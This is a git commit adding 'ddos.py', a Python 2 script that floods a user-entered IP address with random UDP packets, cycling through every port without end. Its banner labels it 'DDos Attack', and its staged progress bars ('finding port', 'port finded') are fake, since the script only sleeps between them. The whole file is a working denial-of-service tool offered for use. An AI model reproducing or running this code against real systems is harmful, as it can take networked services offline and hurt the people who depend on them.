508d0ae8b9db9a7c9725a68ac2eeb8fb19b1acab
amar yadav <amar9966yadav@gmail.com>
2022-09-22 18:45:44 +0530

    added script and updated readme

---
+++ ddos.py
@@ -0,0 +1,48 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet -f shadow DDos Attack")
+print
+print "github   : https://github.com/Amarendra-ai"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Dos")
+print "[                    ] preparing"
+time.sleep(5)
+print "[=====               ] started"
+time.sleep(5)
+print "[==========          ] finding port"
+time.sleep(5)
+print "[===============     ] port finded"
+time.sleep(5)
+print "[====================] Attacking"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
